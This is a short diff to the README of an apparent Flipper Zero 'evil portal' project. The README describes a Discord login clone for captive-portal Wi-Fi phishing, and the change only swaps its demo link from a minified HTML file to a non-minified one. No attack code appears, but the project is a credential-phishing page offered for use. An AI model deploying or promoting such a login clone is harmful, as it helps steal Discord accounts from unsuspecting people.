@@ -6,7 +6,7 @@ Discord login for evil portal
 
 - Discord login clone
 - Compatible with evil portal
-- Demo [here](https://raw.githack.com/JM26NET/flipper-zero-evil-portal/main/portals/discord-assets/Discord%20nano.min.html)
+- Demo [here](https://raw.githack.com/JM26NET/flipper-zero-evil-portal/main/portals/discord-assets/Discord%20nano.html)
 
 INFO: I will update this repo at the end of this week, as I am currently on vacation. Thanks
 
